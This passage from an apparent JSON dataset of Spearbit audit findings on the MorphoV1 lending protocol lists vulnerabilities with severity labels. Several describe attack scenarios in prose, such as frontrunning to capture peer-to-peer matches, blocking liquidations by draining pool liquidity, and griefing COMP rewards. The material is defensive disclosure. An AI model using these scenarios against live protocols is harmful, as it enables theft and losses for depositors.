        "body": "For a given asset x, liquidity is supplied on the pool since there are not enough borrowers. suppli- ersOnPool head: 0xa with 1000 units of x whenever there is a new transaction in the mempool to borrow 100 units of x,  Frontrunner supplies 1001 units of x and is supplied on pool.  updateSuppliers will put the frontrunner on the head (assuming very high gas is supplied).  Borrower's transaction lands and is matched 100 units of x with a frontrunner in p2p.  Frontrunner withdraws the remaining 901 left which was on the underlying pool. Favorable conditions for an attack:  Relatively fewer gas fees & relatively high block gas limit.  insertSorted is able to traverse to head within block gas limit (i.e length of DLL). Since this is a non-atomic sandwich, the frontrunner needs excessive capital for a block's time period.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Differences between Morpho and Compound borrow validation logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between them;  Compound has a mechanism to prevent borrows if the new borrowed amount would go above the current borrowCaps[cToken] threshold. Morpho does not check this threshold and could allow users to borrow on the P2P side (avoiding the revert because it would not trigger the underlying compound borrow action). Morpho should anyway monitor the borrowCaps of the market because it could make increaseP2PDeltasLogic and _unsafeWithdrawLogic reverts.  Both Morpho and Compound do not check if a market is in \"deprecated\" state. This means that as soon as a user borrows some tokens, he/she can be instantly liquidated by another user.  If the flag is true on Compound, the Morpho User can be liquidated directly on compound.  If the flag is true on Morpho, the borrower can be liquidated on Morpho.  Morpho does not check if borrowGuardianPaused[cToken] on Compound, a user could be able to borrow in P2P while the cToken market has borrow paused. More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Compound\".",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Users can continue to borrow from a deprecated market",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "When a market is being marked as deprecated, there is no verification that the borrow for that market has already been disabled. This means a user could borrow from this market and immediately be eligible to be liquidated.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "ERC20 with transfer's fee are not handled by *PositionManager",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "Some ERC20 tokens could have fees attached to the transfer event, while others could enable them in the future (see USDT, USDC). The current implementation of both PositionManager (for Aave and Compound) is not taking into consideration these types of ERC20 tokens. While Aave seems not to take into consideration this behavior (see LendingPool.sol), Compound, on the other hand, is explicitly handling it inside the doTransferIn function. Morpho is taking for granted that the amount specified by the user will be the amount transferred to the contract's balance, while in reality, the contract will receive less. In supplyLogic, for example, Morpho will account for the user's p2p/pool balance for the full amount but will repay/supply to the pool less than the amount accounted for.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Cannot liquidate Morpho users if no liquidity on the pool",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "Morpho implements liquidations by repaying the borrowed asset and then withdrawing the collateral If there is no liquidity in the collateral asset pool the asset from the underlying protocol (Aave / Compound). liquidation will fail. Morpho could incur bad debt as they cannot liquidate the user. The liquidation mechanisms of Aave and Compound work differently: They allow the liquidator to seize the debtorsTokens/cTokens which can later be withdrawn for the underlying token once there is enough liquidity in the pool. Technically, an attacker could even force no liquidity on the pool by frontrunning liquidations by borrowing the entire pool amount - preventing them from being liquidated on Morpho. However, this would require significant capital as collateral in most cases.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Supplying and borrowing can recreate p2p credit lines even if p2p is disabled",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "When supplying/borrowing the algorithm tries to reduce the deltas p2pBorrowDelta/p2pSupplyDelta by moving borrowers/suppliers back to P2P. It is not checked if P2P is enabled. This has some consequences related to when governance disables P2P and wants to put users and liquidity back on the pool through increaseDelta calls. The users could enter P2P again by supplying and borrowing.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "In Compound implementation, P2P indexes can be stale",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The current implementation of MorphoUtils._isLiquidatable loops through all of the tokens in which the user has supplied to/borrowed from. The scope of the function is to check whether the user can be liquidated or not by verifying that debtValue > maxDebtValue. Resolving \"Compound liquidity computation uses outdated cached borrowIndex\" implies that the Compound bor- row index used is always up-to-date but the P2P issues associated with the token could still be out of date if the market has not been used recently, and the underlying Compound indexes (on which the P2P index is based) has changed a lot. As a consequence, all the functions that rely on _isLiquidatable (liquidate, withdraw, borrow) could return a wrong result if the majority of the user's balance is on the P2P balance (the problem is even more aggravated without resolving \"Compound liquidity computation uses outdated cached borrowIndex\". Let's say, for example:  Alice supplies ETH in pool  Alice supplies BAT in P2P  Alice borrows some DAI At some point in time the ETH value goes down, but the interest rate of BAT goes up. If the P2P index of BAT had been correctly up-to-date, Alice would have been still solvent, but she gets liquidated by Bob who calls liq- uidate(alice, ETH, DAI) Even by fixing \"Compound liquidity computation uses outdated cached borrowIndex\" Alice would still be liquidated because her entire collateral is on P2P and not in the pool.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Turning off an asset as collateral on Morpho-Aave still allows seizing of that collateral on Morpho and leads to liquidations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The Morpho Aave deployment can set the asset to not be used as collateral for Aave's Morpho contract position. On Aave, this prevents liquidators from seizing this asset as collateral. 1. However, this prevention does not extend to users on Morpho as Morpho has not implemented this check. Liquidations are performed through a repay & withdraw combination and withdrawing the asset on Aave is still allowed. 2. When turning off the asset as collateral, the single Morpho contract position on Aave might still be over- collateralized, but some users on Morpho suddenly lose this asset as collateral (LTV becomes 0) and will be liquidated.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "claimToTreasury(COMP) steals users' COMP rewards",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The claimToTreasury function can send a market's underlying tokens that have been accumulated in the contract to the treasury. This is intended to be used for the reserve amounts that accumulate in the contract from P2P matches. However, Compound also pays out rewards in COMP and COMP is a valid Compound market. Sending the COMP reserves will also send the COMP rewards. This is especially bad as anyone can claim COMP rewards on the behalf of Morpho at any time and the rewards will be sent to the contract. An attacker could even frontrun a claimToTreasury(cCOMP) call with a Comptroller.claimComp(morpho, [cComp]) call to sabotage the reward system. Users won't be able to claim their rewards.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Compound liquidity computation uses outdated cached borrowIndex",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The _isLiquidatable iterates over all user-entered markets and calls _getUserLiquidity- DataForAsset(poolToken) -> _getUserBorrowBalanceInOf(poolToken). However, it only updates the indexes of markets that correspond to the borrow and collateral assets. The _getUserBorrowBalanceInOf function computes the underlying pool amount of the user as userBorrowBalance.onPool.mul(lastPoolIndexes[_- poolToken].lastBorrowPoolIndex);. Note that lastPoolIndexes[_poolToken].lastBorrowPoolIndex is a value that was cached by Morpho and it can be outdated if there has not been a user-interaction with that market for a long time. The liquidation does not match Compound's liquidation anymore and users might not be liquidated on Morpho that could be liquidated on Compound. Liquidators would first need to trigger updates to Morpho's internal borrow indexes.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "HeapOrdering.getNext returns the root node for nodes not in the list",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "If an id does not exist in the HeapOrdering the getNext() function will return the root node uint256 rank = _heap.ranks[_id]; // @audit returns 0 as rank. rank + 1 will be the root if (rank < _heap.accounts.length) return getAccount(_heap, rank + 1).id; else return address(0);",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Heap only supports balances up to type(uint96).max",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The current heap implementation packs an address and the balance into a single storage slot which If a token has 18 decimals, the largest restricts the balance to the uint96 type with a max value of ~7.9e28. balance that can be stored will be 7.9e10. This could lead to problems with a token of low value, for example, if 1.0 tokens are worth 0.0001$, a user could only store 7_900_000$.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Delta leads to incorrect reward distributions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "Delta describes the amount that is on the pool but still wrongly tracked as inP2P for some users. There are users that do not have their P2P balance updated to an equivalent pool balance and therefore do not earn rewards. There is now a mismatch of this delta between the pool balance that earns a reward and the sum of pool balances that are tracked in the reward manager to earn that reward. The increase in delta directly leads to an increase in rewards for all other users on the pool.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "When adding a new rewards manager, users already on the pool won't be earning rewards",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "When setting a new rewards manager, existing users that are already on the pool are not tracked and won't be earning rewards.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "liquidationThreshold computation can be moved for gas efficiency",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The vars.liquidationThreshold computation is only relevant if the user is supplying this asset. Therefore, it can be moved to the if (_isSupplying(vars.userMarkets, vars.borrowMask)) branch.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Add max approvals to markets upon market creation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "Approvals to the Compound markets are set on each supplyToPool function call.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "isP2PDisabled flag is not updated by setIsPausedForAllMarkets",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The current implementation of _setPauseStatus does not update the isP2PDisabled. When _- isPaused = false this is not a real problem because once all the flags are enabled (everything is paused), all the operations will be blocked at the root of the execution of the process. There might be cases instead where isP2PDisabled and the other flags were disabled for a market and Morpho want to enable all of them, resuming all the operations and allowing the users to continue P2P usage. In this case, Morpho would only resume operations without allowing the users to use the P2P flow. function _setPauseStatus(address _poolToken, bool _isPaused) internal { Types.MarketPauseStatus storage pause = marketPauseStatus[_poolToken]; pause.isSupplyPaused = _isPaused; pause.isBorrowPaused = _isPaused; pause.isWithdrawPaused = _isPaused; pause.isRepayPaused = _isPaused; pause.isLiquidateCollateralPaused = _isPaused; pause.isLiquidateBorrowPaused = _isPaused; // ... event emissions }",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Differences between Morpho and Aave liquidate validation logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between the logic Note: Morpho re-implements the liquidate function as a mix of  repay + supply operations on Aave executed inside _unsafeRepayLogic where needed  withdraw + borrow operations on Aave executed inside _unsafeWithdrawLogic where needed From _unsafeRepayLogic (repay + supply on pool where needed)  Because _unsafeRepayLogic internally call aave.supply the whole tx could fail in case the supplying has been disabled on Aave (isFrozen == true) for the _poolTokenBorrowed  Morpho is not checking that the Aave borrowAsset has isActive == true  Morpho do not check that remainingToRepay.rayDiv(poolIndexes[_poolToken].poolBorrowIndex) > 0. Trying to repay that amount to Aave would make the whole tx revert 16  Morpho do not check that remainingToSupply.rayDiv(poolIndexes[_poolToken].poolSupplyIndex) > 0. Trying to borrow that amount to Aave would make the whole tx revert From _unsafeWithdrawLogic (withdraw + borrow on pool where needed)  Because _unsafeWithdrawLogic internally calls aave.borrow the whole tx could fail in case the borrowing has been disabled on Aave (isFrozen == true or borrowingEnabled == false) for the _poolTokenCol- lateral  Morpho is not checking that the Aave collateralAsset has isActive == true  Morpho do not check that remainingToWithdraw.rayDiv(poolIndexes[_poolToken].poolSupplyIndex) > 0. Trying to withdraw that amount from Aave would make the whole tx revert  Morpho do not check that remainingToBorrow.rayDiv(poolIndexes[_poolToken].poolBorrowIndex) > 0. Trying to borrow that amount from Aave would make the whole tx revert More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Aave\".",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Differences between Morpho and Aave repay validation logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between the logic Note: Morpho re-implement the repay function as a mix of repay + supply operations on Aave where needed  Both Aave and Morpho are not handling ERC20 token with fees on transfer  Because _unsafeRepayLogic internally call aave.supply the whole tx could fail in case the supplying has been disabled on Aave (isFrozen == true)  Morpho is not checking that the Aave market has isActive == true  Morpho do not check that remainingToRepay.rayDiv(poolIndexes[_poolToken].poolBorrowIndex) > 0. Trying to repay that amount to Aave would make the whole tx revert  Morpho do not check that remainingToSupply.rayDiv(poolIndexes[_poolToken].poolSupplyIndex) > 0. Trying to supply that amount to Aave would make the whole tx revert More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Aave\".",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Differences between Morpho and Aave withdraw validation logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between the logic Note: Morpho re-implement the withdraw function as a mix of withdraw + borrow operations on Aave where needed  Both Aave and Morpho are not handling ERC20 token with fees on transfer  Because _unsafeWithdrawLogic internally calls aave.borrow the whole tx could fail in case the borrowing has been disabled on Aave (isFrozen == true or borrowingEnabled == false)  Morpho is not checking that the Aave market has isActive == true  Morpho do not check that remainingToWithdraw.rayDiv(poolIndexes[_poolToken].poolSupplyIndex) > 0. Trying to withdraw that amount from Aave would make the whole tx revert  Morpho do not check that remainingToBorrow.rayDiv(poolIndexes[_poolToken].poolBorrowIndex) > 0. Trying to borrow that amount from Aave would make the whole tx revert Note 1: Aave is NOT checking that the market isFrozen. This means that users can withdraw even if the market is active but frozen More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Aave\".",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Differences between Morpho and Aave borrow validation logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between the logics Note: Morpho re-implement the borrow function as a mix of withdraw + borrow operations on Aave where needed  Both Aave and Morpho are not handling ERC20 token with fees on transfer  Morpho is not checking that the Aave market has isFrozen == false (check done by Aave on the borrow operation), users could be able to borrow in P2P even if the borrow is paused on Aave (isFrozen == true) because Morpho would only call the aave.withdraw (where the frozen flag is not checked)  Morpho do not check if market is active (would borrowingEnabled == false if market is not active?)  Morpho do not check if market is frozen (would borrowingEnabled == false if market is not frozen?)  Morpho do not check that healthFactor > GenericLogic.HEALTH_FACTOR_LIQUIDATION_THRESHOLD  Morpho do not check that remainingToBorrow.rayDiv(poolIndexes[_poolToken].poolBorrowIndex) > 0. Trying to borrow that amount from Aave would make the whole tx revert More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Aave\".",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Differences between Morpho and Aave supply validation logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between the logics Note: Morpho re-implement the supply function as a mix of repay + supply operations on Aave where needed  Both Aave and Morpho are not handling ERC20 token with fees on transfer  Morpho is not checking that the Aave market has isFrozen == false, users could be able to supply in P2P even if the supply is paused on Aave (isFrozen == true) because Morpho would only call the aave.repay (where the frozen flag is not checked)  Morpho is not checking if remainingToSupply.rayDiv( poolIndexes[_poolToken].poolSupplyIndex ) === 0. Trying to supply that amount to Aave would make the whole tx revert 19 More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Aave\".",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Morpho should avoid creating a new market when the underlying Aave market is frozen",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "In the current implementation of Aave MorphoGovernance.createMarket the function is only check- ing if the AToken is in active state. Morpho should also check if the AToken is not in a frozen state. When a market is frozen, many operations on the Aave side will be prevented (reverting the transaction).",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Differences between Morpho and Compound liquidate validation logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. Note: Morpho liquidation does not directly call compound.liquidate but acts as a repay + withdraw operation. By reviewing both logic, we have noticed that there are some differences between the logic  Morpho does not check Compound seizeGuardianPaused because it is not implementing a \"real\" liquidate on compound, but it's emulating it as a \"repay\" + \"withdraw\".  Morpho should anyway monitor off-chain when the value of seizeGuardianPaused changes to true. Which are the scenarios for which Compound decides to block liquidations (across all cTokens)? When this happens, is Compound also pausing all the other operations?  [Open question] Should Morpho pause liquidations when the seizeGuardianPaused is true?  Morpho is not reverting if msg.sender === borrower  Morpho does not check if _amount > 0  Compound revert if amountToSeize > userCollateralBalance, Morpho does not revert and instead uses min(amountToSeize, userCollateralBalance) 20 More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Aave\".",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "repayLogic in Compound PositionsManagershould revert if toRepay is equal to zero",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The current implementation of repayLogic is correctly reverting if _amount == 0 but is not reverting if toRepay == 0. The value inside toRepay is given by the min value between _getUserBorrowBalanceInOf(_- poolToken, _onBehalf) and _amount. If the _onBehalf user has zero debt, toRepay will be initialized with zero.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Differences between Morpho and Compound supply validation logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between them;  Compound is handling ERC20 tokens that could have transfer fees, Morpho is not doing it right now, see\"ERC20 with transfer's fee are not handled by PositionManager\".  Morpho is not checking if the underlying Compound market has been paused for the supply action (see mintGuardianPaused[token]). This means that even if the Compound supply is paused, Morpho could allow users to supply in the P2P.  Morpho is not checking if the market on both Morpho and Compound has been deprecated. If the deprecation flag is intended to be true for a market that will be removed in the next future, probably Morpho should not allow users to provide collateral for such a market. More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Compound\".",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider creating a documentation that covers all the Morpho own flags, lending protocol's flags and how they interact/override each other",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "Both Morpho and Aave/Compound have their own flags to check before allowing a user to interact with the protocols. Usually, Morpho has decided to follow the logic to map 1:1 the implementation of the underlying protocol validation. There are some examples also where Morpho has decided to override some of their own internal flags For example, in the Aave aave-v2/ExitPositionsManager.liquidateLogic even if a Morpho market has been flagged as \"deprecated\" (user can be liquidated without being insolvent) the liquidator would not be able to liquidate the user if the liquidation logic has been paused.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing natspec or typos in natspec",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "- Updated the natspec updateP2PIndexes replacing \"exchangeRatesStored()\" with \"exchangeRate- Stored()\"  Updated the natspec _updateP2PIndexes replacing \"exchangeRatesStored()\" with \"exchangeRateStored()\"  Updated the natspec for event MarketCreated replacing \"_poolToken\" with \"_p2pIndexCursor\"",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Removed unused \"named\" return parameters from functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "Some functions in the codebase are defining \"named\" functions parameter that are not used explicitly inside the code. This could lead to future changes to return wrong values if the \"explicit return\" statement is removed and the function returns the \"default\" values (based on the variable type) of the \"named\" parameter.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider merging the code of CompoundMath libraries and use only one",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The current codebase uses libraries/CompoundMath.sol but there's already an existing solidity library with the same name inside the package @morpho-dao/morpho-utils For better code clarity, consider merging those two libraries and only importing the one from the external pack- age. Be aware that the current implementation inside the @morpho-dao/morpho-utils CompoundMath mul and div function uses low-level yul and should be tested, while the library used right now in the code use \"high level\" solidity. the",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider reverting the creation of a deprecated market in Compound",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "Compound has a mechanism that allows the Governance to set a specific market as \"deprecated\". Once a market is deprecated, all the borrows can be liquidated without checking whether the user is solvent or not. Compound currently allows users to enter (to supply and borrow) a market. In the current version of MorphoGovernance.createMarket, Morpho governance is not checking whether a market is already deprecated on compound before entering it and creating a new Morpho-market. This would allow a Morpho user to possibly supply or borrow on a market that has been already deprecated by compound.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document HeapOrdering",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "Morpho uses a non-standard Heap implementation for their Aave P2P matching engine. The im- plementation only correctly sorts _maxSortedUsers / 2 instead of the expected _maxSortedUsers. Once the _maxSortedUsers is reached, it halves the size of the heap, cutting the last level of leaves of the heap. This is done because a naive implementation that would insert new values at _maxSortedUsers (once the heap is full) and shift them up, then decrease the size to _maxSortedUsers - 1 again, would end up concentrating all new values on the same single path from the leaf to the root node. Cutting off the last level of nodes of the heap is a heuristic to remove low-value nodes (because of the heap property) while at the same time letting new values be shifted up from different leaf locations. In the end, the goal this tries to achieve is that more high-value nodes are stored in the heap and can be used for the matching engine.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider removing the Aave-v2 reward management logic if it is not used anymore",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "If the current aave-v2 reward program has ended and the Aave protocol is not re-introducing it anytime soon (if not at all) consider removing the code that currently is handling all the logic behind claiming rewards from the Aave lending pool for the supplied/borrow assets. Removing that code would make the codebase cleaner, reduce the attack surface and possibly revert in case some of the state variables are incorrectly miss configured (rewards management on Morpho is activated but Aave is not distributing rewards anymore).",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Avoid shadowing state variables",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "Shadowing state or global variables could lead to potential bugs if the developer does not treat them carefully. To avoid any possible problem, every local variable should avoid shadowing a state or global variable name.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational aave-"
        ]
    },
    {
        "title": "Governance setter functions do not check current state before updates",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "In MorphoGovernance.sol, many of the setter functions allow the state to be changed even if it is already set to the passed-in argument. For example, when calling setP2PDisabled, there are no checks to see if the _poolToken is already disabled, or does not allow unnecessary state changes.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Emit event for amount of dust used to cover withdrawals",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "Consider emitting an event that includes the amount of dust that was covered by the contract balance. A couple of ways this could be used:  Trigger an alert whenever it exceeds a certain threshold so you can inspect it, and pause if a bug is found or a threshold is exceeded.  Use this value as part of your overall balance accounting to verify everything adds up.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Break up long functions into smaller composable functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "A few functions are 100+ lines of code which makes it more challenging to initially grasp what the function is doing. You should consider breaking these up into smaller functions which would make it easier to grasp the logic of the function, while also enabling you to easily unit test the smaller functions.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove unused struct members",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The HealthFactorVars struct contains three attributes, but only the userMarkets attribute is ever set or used. These should be removed to increase code readability.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove unused struct",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "There is an unused struct BorrowAllowedVars. This should be removed to improve code readability.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "No validation check on prices fetched from the oracle",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "Currently in the liquidateLogic function when fetching the borrowedTokenPrice and collateral- Price from the oracle, the return value is not validated. This is due to the fact that the underlying protocol does not do this check either, but the fact that the underlying protocol does not do validation should not deter Morpho from performing validation checks on prices fetched from oracles. Also, this check is done in the Compound PositionsManager.sol here so for code consistency, it should also be done in Aave-v2.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "onBehalf argument can be set as the Morpho protocols address",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "When calling the supplyLogic function, currently the _onBehalf argument allows a user to supply funds on behalf of the Morpho protocol itself. While this does not seem exploitable, it can still be a cause for user error and should not be allowed.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "maxSortedUsers has no upper bounds validation and is not the same in Compound/Aave-2",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "In MorphoGovernance.sol, the maxSortedUsers function has no upper bounds limit put in place. The maxSortedUsers is the number of users to sort in the data structure. Also, while this function has the MaxSorte- dUsersCannotBeZero() check in Aave-v2, the Compound version is missing this same error check.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider adding the compound revert error code inside Morpho custom error to better track the revert reason",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
